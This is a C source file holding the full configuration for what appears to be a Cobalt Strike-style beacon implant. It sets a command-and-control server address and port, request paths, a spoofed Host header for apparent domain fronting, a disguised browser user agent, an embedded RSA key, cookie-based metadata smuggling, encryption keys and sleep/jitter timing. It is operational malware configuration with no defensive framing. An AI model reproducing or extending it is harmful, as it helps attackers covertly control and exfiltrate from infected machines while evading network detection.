#include "Config.h"
#include <Windows.h>

// HTTP configuration
const wchar_t* g_server = L"192.168.86.132";
const wchar_t* g_get_path = L"/www/handle/doc";
const wchar_t* g_post_path = L"/IMXo";
INTERNET_PORT g_port = 8011;
const wchar_t* g_host_header = L"Host: aliyun.com\r\n";
const wchar_t* g_user_agent_header = L"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9; ENUS)\r\n";
const wchar_t* g_server_header = L"Server: nginx\r\n";
const wchar_t* g_content_type_header = L"Content-Type: application/x-www-form-urlencoded\r\n";

// Public key for RSA encryption
char* g_public_key_str = "-----BEGIN PUBLIC KEY-----\n"
"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFuBEComVxOz5p5SxyMblUbjMZ\n"
"CsRNHiIIPd7BS4saKfD1wf3j9ItmpUzbvpv1OnkCoi3nerrF2br9BMkRPN3oZYI6\n"
"49ppquLXVRpc0n9bQBxl2JmhNBjkw5ep2GhB2nBp/tTZZe5kUjSfDcI+QpDhLHHo\n"
"4wFttHQVpUpl3jZ1lwIDAQAB\n"
"-----END PUBLIC KEY-----\n";

// Metadata configuration
const char* g_metadata_prepend = "SESSIONID=";
const char* g_metadata_header = "Cookie:";
const char* g_response_prepend = "data=";
const char* g_response_append = "%%";

// POST data configuration
const char* g_http_post_id_prepend = "user=";
const char* g_http_post_id_append = "%%";
const char* g_http_post_client_output_prepend = "data=";
const char* g_http_post_client_output_append = "%%";
const char* g_post_header_name = "User:";

// Encryption configuration
const char g_netbios_key = 'A';
const char g_iv[16] = "abcdefghijklmnop";

// Runtime configuration
int g_sleeptime = 5000;
int g_jitter = 100;
unsigned char g_aeskey[16] = { 0 };
unsigned char g_hmackey[16] = { 0 };
int g_counter = 0;
int g_client_id = 0;

